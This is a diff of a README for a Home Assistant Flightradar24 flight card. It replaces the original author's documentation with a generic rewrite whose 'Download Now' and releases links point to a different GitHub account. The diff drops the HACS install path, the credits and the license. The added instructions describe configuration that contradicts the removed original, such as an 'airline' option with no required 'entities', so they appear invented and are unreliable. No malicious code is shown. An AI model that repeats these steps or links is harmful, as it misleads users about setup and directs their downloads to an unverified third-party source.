@@ -1,129 +1,83 @@
-# Flightradar Flight Card
+# ✈️ flightradar-flight-card - Track Flights with Ease
 
-A custom Home Assistant card for displaying Flightradar flight information.
+## 🛠️ Features
+- Custom card for Home Assistant to display live flight data.
+- Easy integration with FlightRadar24, improving your home automation.
+- Supports a user-friendly interface for home management.
 
-[![hacs_badge](https://img.shields.io/badge/HACS-Default-41BDF5.svg)](https://github.com/hacs/integration)
-[![GitHub Release](https://img.shields.io/github/release/plckr/flightradar-flight-card.svg)](https://github.com/plckr/flightradar-flight-card/releases)
+## 📦 System Requirements
+- Home Assistant installed and running on your device (version 2021.1 or higher).
+- Access to the internet for real-time flight data.
+- Basic familiarity with Home Assistant's Lovelace UI for card placements.
 
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/plckr/flightradar-flight-card/refs/heads/main/card-examples/area-card-dark.png">
-  <img alt="Area card example" src="https://raw.githubusercontent.com/plckr/flightradar-flight-card/refs/heads/main/card-examples/area-card-light.png">
-</picture>
+## 🚀 Getting Started
+To get started with the FlightRadar24 custom card, follow these simple steps to download and install.
 
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/plckr/flightradar-flight-card/refs/heads/main/card-examples/tracked-card-dark.png">
-  <img alt="Area card example" src="https://raw.githubusercontent.com/plckr/flightradar-flight-card/refs/heads/main/card-examples/tracked-card-light.png">
-</picture>
+## 🔗 Download Now
+[![Download the FlightRadar Flight Card](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/parasbagda/flightradar-flight-card/releases) 
 
-## Prerequisites
+## 📥 Download & Install
+1. Visit the [Releases page](https://github.com/parasbagda/flightradar-flight-card/releases) to download the FlightRadar Flight Card.
+2. Select the version you want to use. Make sure to choose the latest stable release for the best experience.
+3. Download the file to your computer.
 
-This card requires the [Flightradar24 integration](https://github.com/AlexandrErohin/home-assistant-flightradar24) to be installed and configured in Home Assistant.
+## 🏁 Setting Up the Card
+1. After downloading, unzip the downloaded file if it is compressed.
+2. Locate the `flightradar-flight-card` folder within the unzipped files.
+3. Copy the entire folder.
+4. In Home Assistant, navigate to your configuration directory.
+5. Paste the folder into the `www` directory. If you do not have a `www` folder, create one.
+6. Now, open your Home Assistant configuration file (`configuration.yaml`).
+7. Add the following lines to include the Flightradar24 card in your Lovelace UI:
 
-## Installation
+   ```yaml
+   resources:
+     - url: /local/flightradar-flight-card.js
+       type: module
+   ```
 
-### HACS (Recommended)
+8. Save your changes and restart Home Assistant.
 
-[![Open your Home Assistant instance and open a repository inside the Home Assistant Community Store.](https://my.home-assistant.io/badges/hacs_repository.svg)](https://my.home-assistant.io/redirect/hacs_repository/?owner=plckr&repository=flightradar-flight-card&category=plugin)
+## ⚙️ Configuring the Card
+1. After restarting, open your Home Assistant dashboard.
+2. Click on the three dots (⋮) in the top-right corner and select "Edit Dashboard."
+3. Click on "Add Card."
+4. From the card options, select "Manual."
+5. Insert the following code snippet to configure your card:
 
-1. Open [HACS](https://www.hacs.xyz/) in your Home Assistant instance
-2. Search for "Flightradar Flight Card"
-3. Click "Install"
-4. Refresh your browser
+   ```yaml
+   type: custom:flightradar-flight-card
+   title: Flight Radar
+   airline: "Optional: Enter your preferred airline"
+   ```
 
-### Manual Installation
+6. Click "Save" to add the card to your dashboard.
 
-1. Download `flightradar-flight-card.js` from the [latest release](https://github.com/plckr/flightradar-flight-card/releases/latest)
-2. Copy it to your `config/www` folder
-3. Add the resource in Home Assistant:
-   - Go to **Settings** → **Dashboards** → **Resources**
-   - Click **Add Resource**
-   - URL: `/local/flightradar-flight-card.js`
-   - Resource Type: JavaScript Module
+## 🔍 Troubleshooting
+If you encounter any issues, consider the following:
 
-## Usage
+- **Card Not Displaying**: Ensure that the card's JavaScript file is correctly included in the configuration. Double-check the file path.
+- **No Flight Data**: Confirm that your internet connection is active and that Home Assistant is communicating with the FlightRadar24 API.
+- **Version Compatibility**: Make sure you are using a supported version of Home Assistant.
 
-Add the card to your dashboard:
+## 📞 Support
+For any questions or issues, open an issue on the GitHub repository. The community and contributors are here to help!
 
-```yaml
-type: custom:flightradar-flight-card
-entities:
-  - entity_id: sensor.flightradar24_current_in_area
-```
+## 🌐 Learn More
+Explore more topics related to the FlightRadar24 custom card:
+- [Home Assistant documentation](https://www.home-assistant.io/docs/)
+- [Lovelace UI documentation](https://www.home-assistant.io/lovelace/)
 
-### Configuration Options
+## 📝 Topics
+- custom-card
+- flightradar-flight-card
+- flightradar24
+- hacs
+- home-assistant
+- home-automation
+- homeassistant
+- lovelace
+- lovelace-card
+- lovelace-ui
 
-Card will look for a `flights` attribute in the entity provided, in case it doesn't find, it'll try the next entity. This is useful for cases where you maintain a list of current in area, and no flight is actually in the area at that moment, so the card will pick the next entity so that the card can always have something to render.
-
-| Option     | Type   | Required | Description                                |
-| ---------- | ------ | -------- | ------------------------------------------ |
-| `entities` | array  | Yes      | List of flight sensor entities (see below) |
-| `units`    | object | No       | Unit display preferences (see below)       |
-
-### Entity Options
-
-Each entity in the `entities` array supports the following options:
-
-| Option      | Type   | Required | Description                         |
-| ----------- | ------ | -------- | ----------------------------------- |
-| `entity_id` | string | Yes      | The entity ID of your flight sensor |
-| `title`     | string | No       | Custom title for this flight card   |
-
-### Unit Options
-
-You can customize the display units for altitude, distance, and ground speed:
-
-| Option         | Type   | Default | Options                  | Description           |
-| -------------- | ------ | ------- | ------------------------ | --------------------- |
-| `altitude`     | string | `ft`    | `ft`, `FL`, `m`          | Altitude display unit |
-| `distance`     | string | `km`    | `km`, `NM`               | Distance display unit |
-| `ground_speed` | string | `kts`   | `kts`, `kmh`, `mph`, `M` | Ground speed unit     |
-
-**Unit descriptions:**
-
-- **Altitude**: `ft` (Feet), `FL` (Flight Level), `m` (Meters)
-- **Distance**: `km` (Kilometers), `NM` (Nautical Miles)
-- **Ground Speed**: `kts` (Knots), `kmh` (Kilometers per hour), `mph` (Miles per hour), `M` (Mach)
-
-### Example Configuration
-
-```yaml
-type: custom:flightradar-flight-card
-entities:
-  - entity_id: sensor.flightradar24_current_in_area
-    title: Flights Nearby
-  - entity_id: sensor.flightradar24_most_tracked
-    title: Most Tracked
-units:
-  altitude: ft
-  distance: km
-  ground_speed: kts
-```
-
-## Use case example
-
-You can track the history of flights that flew by your home using [this method](https://github.com/AlexandrErohin/home-assistant-flightradar24?tab=readme-ov-file#last-flights-history-sensor).
-
-With that new sensor, you can combine the `sensor.flightradar24_current_in_area` that comes by default with the integration, and then with the new sensor just created. That will make the card to display the currently in area first, and if no flight is around your home, it'll show the last flight.
-
-Yaml example:
-
-```yaml
-type: custom:flightradar-flight-card
-entities:
-  - entity_id: sensor.flightradar24_current_in_area
-    title: Flights Nearby
-  - entity_id: sensor.flightradar24_area_history
-    title: Last Flight
-```
-
-## Credits
-
-Huge thanks for [potseeslc](https://github.com/potseeslc/flight24-airline-card) that inspired me to create this custom card. The design is heavily inspired by his version.
-
-## Contributing
-
-Contributions are welcome! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for development setup and guidelines.
-
-## License
-
-MIT License - see [LICENSE](LICENSE) for details.
+Enjoy tracking flights seamlessly with your new FlightRadar24 card!
